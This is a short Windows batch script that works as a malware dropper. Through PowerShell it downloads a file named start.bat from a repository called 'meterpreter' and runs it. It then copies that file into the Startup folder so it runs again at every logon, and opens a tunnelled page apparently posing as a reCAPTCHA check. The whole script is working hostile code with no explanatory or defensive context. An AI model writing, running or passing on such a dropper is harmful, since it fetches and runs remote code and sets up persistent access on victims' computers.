@echo off
set tempPath=%temp%

if not exist "%tempPath%" (
    echo temp path not found
) else (
    cd /d "%tempPath%"
    powershell -Command ^
        "try { (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/0x2034/meterpreter/main/start.bat', 'start.bat'); Start-Process 'start.bat' } catch { Write-Output 'Failed to download or start the file. Error: ' + $_ }"
)
move "%temp%\start.bat" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
start https://fbed484c6ea22e0467671566e490de70.serveo.net/reCaPTCHA/r.html
